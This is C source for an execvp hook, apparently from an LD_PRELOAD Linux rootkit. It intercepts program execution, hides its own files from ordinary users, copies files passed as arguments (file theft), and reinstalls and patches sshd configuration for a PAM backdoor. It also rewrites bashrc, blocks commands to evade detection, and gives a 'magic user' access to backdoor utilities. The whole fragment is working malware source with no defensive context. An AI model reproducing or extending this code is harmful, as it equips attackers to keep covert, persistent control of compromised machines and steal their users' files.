int execvp(const char *filename, char *const argv[]){
#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL && defined CLEAN_STOLEN_FILES
    cleanstolen();
#endif
#ifdef CLEANSE_HOMEDIR
    bdvcleanse();
#endif
#ifdef ROOTKIT_BASHRC
    checkbashrc();
#endif
#if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
    gidchanger();
#endif
#ifdef DO_REINSTALL
    reinstall();
#endif
#ifdef PATCH_SSHD_CONFIG
    sshdpatch(REG_USR);
#endif

    hook(CEXECVP);

    if(magicusr()){
#ifdef BACKDOOR_ROLF
        if(!fnmatch("*/bdvrolf", argv[0], FNM_PATHNAME))
            dorolfpls();
#endif
#ifdef BACKDOOR_UTIL
        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
            dobdvutil(argv);
#endif
#if defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
        if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
            sshdpatch(MAGIC_USR);
            exit(0);
        }
#endif
        return (long)call(CEXECVP, filename, argv);
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#ifdef FILE_STEAL
    for(int i = 1; argv[i] != NULL; i++)
        inspect_file(argv[i]);
#endif

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
    int evasion_status = evade(filename, argv, NULL);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVP, filename, argv);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
#endif

#ifdef DO_EVASIONS
    if(block_strings(filename, argv)){
        errno = EPERM;
        return -1;
    }
#endif

    return (long)call(CEXECVP, filename, argv);
}
